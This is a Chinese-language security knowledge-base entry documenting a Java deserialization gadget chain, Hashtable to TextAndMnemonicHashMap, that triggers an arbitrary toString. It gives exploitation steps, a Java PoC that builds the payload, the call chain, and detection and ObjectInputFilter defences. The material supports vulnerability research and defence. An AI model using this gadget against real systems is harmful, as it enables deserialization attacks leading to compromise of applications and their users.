---
id: web-java-deserialization-jdk-hashtable-textandmnemonic-tostring
title: Hashtable 配合 TextAndMnemonicHashMap 触发任意 toString
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: hashtable-textandmnemonic-tostring-trigger
tags:
- java
- deserialization
- gadget
- tostring
- hashtable
- swing
- jdk
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:31:02+08:00'
  notes: 已对照原文与截图 03-05 核对：Hashtable.reconstitutionPut 的 e.key.equals(key)→AbstractMap.equals→m.get(key)→TextAndMnemonicHashMap.get 中 key.toString() 链一致，末尾 put(obj,null) 是进入 null 分支触发 toString 的关键；未验证点：原文仅源码分析、无运行截图，且依赖含 Swing 的 JDK，medium 合适
url: /docs/web/java/deserialization/jdk/web-java-deserialization-jdk-hashtable-textandmnemonic-tostring/
draft: false
kb_aliases:
- Hashtable TextAndMnemonicHashMap
- UIDefaults TextAndMnemonicHashMap
- AbstractMap equals toString
- 高版本 toString 触发
- Hashtable reconstitutionPut
---

## 一句话结论

`Hashtable.readObject` 重建哈希表时调用 `reconstitutionPut` → `AbstractMap.equals`，若比较对象是 `javax.swing.UIDefaults$TextAndMnemonicHashMap`，其 `get` 会对 key 调用 `toString`，从而在反序列化时触发任意对象的 `toString`。

## 原理

- `Hashtable.readObject` 逐个读取 entry 并调用 `reconstitutionPut`；当桶中已有相同 hash 的 key 时，会执行 `e.key.equals(key)`。
- 把两个 `TextAndMnemonicHashMap` 作为 Hashtable 的 key，且两者哈希相同，`e.key.equals(key)` 进入 `AbstractMap.equals`。
- `AbstractMap.equals` 遍历 entry，对每个 key 调用 `m.get(key)`；`m` 是 `TextAndMnemonicHashMap`。
- `TextAndMnemonicHashMap.get(Object key)` 在 `super.get(key)==null` 时执行 `String stringKey = key.toString()`，key 由攻击者控制，因此触发任意 `toString`。
- 该链只依赖 JDK 自带的 `javax.swing` 类，不需要额外依赖；作者称在高版本中仍可用。

## 触发条件

- 目标可反序列化攻击者可控的 Java 序列化流。
- JDK classpath 含 `javax.swing.UIDefaults$TextAndMnemonicHashMap`（Swing 组件，桌面 JDK 通常包含；精简 JRE 可能没有）。
- 存在可利用的 `toString` gadget。

## 利用步骤

1. 反射创建两个 `TextAndMnemonicHashMap`（绕过构造器）。
2. 分别放入恶意对象，并设置相同 `loadFactor` 使哈希布局一致。
3. 构造 `Hashtable`，把两个 map 作为 key 放入（值任意）。
4. 再次向两个 map 插入同一个 key（值设为 null），准备 `get` 时的 `toString` 路径。
5. 序列化 Hashtable，通过反序列化入口发送，触发 `toString`。

## PoC

```java
public static Hashtable get_Hashtable_TextAndMnemonicHashMap(Object obj) throws Exception {
    Map t1 = (HashMap) Utils.createWithoutConstructor(
        Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
    Map t2 = (HashMap) Utils.createWithoutConstructor(
        Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));

    t1.put(obj, "yy");
    t2.put(obj, "zZ");
    Utils.setFieldValue(t1, "loadFactor", 1);
    Utils.setFieldValue(t2, "loadFactor", 1);

    Hashtable hashtable = new Hashtable();
    hashtable.put(t1, 1);
    hashtable.put(t2, 1);

    t1.put(obj, null);
    t2.put(obj, null);
    return hashtable;
}
```

调用链：

```text
Hashtable#readObject
  -> Hashtable#reconstitutionPut
    -> AbstractMap#equals
      -> TextAndMnemonicHashMap#get
        -> obj#toString()
```

## 变体与关联

- 变体：`AbstractMap.equals` 的 `m.get(key)` 可换成其他在 `get` 中调用 `toString` 的 Map 实现；`Hashtable` 也可换其他在反序列化时做 key 比较的容器。
- 关联：[[web-java-deserialization-jdk-xstring-equals-tostring]]（XString.equals 触发 toString）；[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（EventListenerList 触发）；[[web-java-deserialization-comparator-rhino]]（Comparator 触发）。
- 边界：原文作者称该链为首次见到，仅做源码分析，未给出运行截图；若目标为无 Swing 的精简 JRE，类不存在，置信度 medium。

## 检测与防御

- 检测：反序列化流中出现 `Hashtable`、`TextAndMnemonicHashMap` 组合；`AbstractMap.equals`/`TextAndMnemonicHashMap.get` 出现在异常栈；`toString` gadget 类被加载。
- 防御：`ObjectInputFilter` 禁止 `javax.swing.UIDefaults$TextAndMnemonicHashMap` 等非业务类；限制 Hashtable 反序列化规模；避免原生 Java 反序列化。
